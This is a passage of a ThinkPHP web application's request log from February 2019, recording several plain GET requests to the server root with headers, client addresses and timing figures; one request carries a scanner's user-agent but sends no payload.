  'host' => '148.70.73.177',
  'user-agent' => 'ZmEu',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'en-us',
  'accept' => '*/*',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-08T16:45:52+08:00 ] 101.91.62.11 GET 148.70.73.177/
[运行时间：0.012256s] [吞吐率：81.59req/s] [内存消耗：1,245.48kb] [文件加载：33]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Close',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_4 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G35 QQ/6.5.3.410 V1_IPH_SQ_6.5.3_1_APP_A Pixel/750 Core/UIWebView NetType/2G Mem/117',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'accept-encoding' => 'deflate, gzip',
  'host' => '148.70.73.177',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-08T21:08:04+08:00 ] 2.179.221.53 GET 148.70.73.177:80/
[运行时间：0.015312s] [吞吐率：65.31req/s] [内存消耗：1,243.09kb] [文件加载：33]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7',
  'host' => '148.70.73.177:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-08T21:12:58+08:00 ] 168.90.32.2 GET 148.70.73.177:80/
[运行时间：0.012378s] [吞吐率：80.79req/s] [内存消耗：1,242.96kb] [文件加载：33]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'host' => '148.70.73.177:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-02-08T22:27:54+08:00 ] 189.50.96.28 GET 148.70.73.177:80/
[运行时间：0.010925s] [吞吐率：91.53req/s] [内存消耗：1,242.96kb] [文件加载：33]
[ info ] [ LANG ] /data/web/php/ischool/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'host' => '148.70.73.177:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\index\controller\Index->index[ /data/web/php/ischool/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
